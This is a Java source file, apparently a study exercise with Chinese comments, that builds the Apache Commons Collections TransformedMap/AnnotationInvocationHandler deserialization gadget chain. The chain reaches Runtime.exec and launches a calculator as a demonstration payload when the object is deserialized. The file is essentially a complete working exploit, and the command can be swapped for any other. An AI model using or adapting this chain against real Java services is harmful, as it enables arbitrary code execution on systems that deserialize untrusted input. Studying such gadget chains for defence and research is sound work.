import com.sun.xml.internal.messaging.saaj.util.ByteInputStream;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class TransformedMapAttack implements Serializable {
    public static void main(String[]args) throws IOException, InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException {
        Transformer[] transformers = new Transformer[]{
                //传入Runtime类
                new ConstantTransformer(Runtime.class),
                //pass
                //反射调用getMethod方法，再反射调用getRuntime方法，返回Runtime.getRuntime()方法
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                //调用invoke方法，再反射执行Runtime.getRuntime()方法，返回Runtime实例化对象
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"open /System/Applications/Calculator.app"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        //------------------------不同的transform()方法的利用方式----------------------------
        //手动调用transform()方法
        //transformerChain.transform("随便填，因为通过上面的利用，使得transform的参数对后面调用的过程没有影响");

        //实现自动化调用transform()方法
     //   Map innerMap = new HashMap();
        //初始化 HashMap
     //   innerMap.put(null,null);
        //调用decorate()方法
     //   Map outerMap = TransformedMap.decorate(innerMap,null,transformerChain);

        //触发漏洞
        //获取AbstractInputCheckedMapDecorator$MapEntry实例对象
     //   Map.Entry Element = (Map.Entry)outerMap.entrySet().iterator().next();
        //调用AbstractInputCheckedMapDecorator$MapEntry.setValue()方法来调用checkSetValue()方法
     //   Element.setValue("anything");
        //以上方法虽然可以完成漏洞利用，但是有个问题，不能在反序列化时自动调用

        //——————————————————————————————————TransformedMap:第一个延长攻击链—————————————————————————————————————————
        Map map = new HashMap();
        map.put("value","11");
        Map transformedmap = TransformedMap.decorate(map,null,transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
        cons.setAccessible(true);
        Object ins  = cons.newInstance(java.lang.annotation.Retention.class,transformedmap);

        ByteArrayOutputStream exp = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(exp);
        oos.writeObject(ins);
        oos.flush();
        oos.close();
        ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(out);
        Object obj = (Object) ois.readObject();

    }
}
